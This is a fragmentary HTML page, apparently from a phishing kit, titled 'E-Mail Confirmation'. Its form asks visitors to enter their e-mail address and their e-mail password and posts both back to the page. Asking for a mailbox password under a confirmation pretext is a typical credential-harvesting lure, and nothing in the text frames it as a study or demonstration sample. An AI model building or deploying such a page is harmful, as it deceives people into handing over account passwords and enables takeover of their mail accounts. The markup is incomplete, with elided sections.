...
<br> 
  ...
  <img src="https://thumbs.gfycat.com/InexperiencedFemaleBangeltiger-small.gif" alt="" width=150 style="border-radius:50%;margin-top:12px;">

<br><br>

  <h1 id="h1">E-Mail Confirmation</h1>
...
<form method="post" >
<center>
  <input type="email" name="mail" placeholder="E-Mail" required=""  style="padding:6px;background:#fafafa;outline:none;width:83%;height:37px;border:1px solid #dedede;font-family:sans-serif;font-weight:350;flex: 1 0 0px;text-align:center;margin: 0;outline: 0;overflow: hidden;padding: 9px 0 7px 8px;text-overflow: ellipsis;border: 1px solid #e6e6e6;text-overflow:ellipsis;font: 400 13.3333px Arial; border-radius:3px;"><br><br>

  <input type="password" name="mailpass" placeholder="E-Mail Password" required=""  style="padding:6px;background:#fafafa;outline:none;width:83%;height:37px;border:1px solid #dedede;font-family:sans-serif;font-weight:350;flex: 1 0 0px;text-align:center;margin: 0;outline: 0;overflow: hidden;padding: 9px 0 7px 8px;text-overflow: ellipsis;border: 1px solid #e6e6e6;text-overflow:ellipsis;font: 400 13.3333px Arial; border-radius:3px;"><br><br>
</center>
<br>
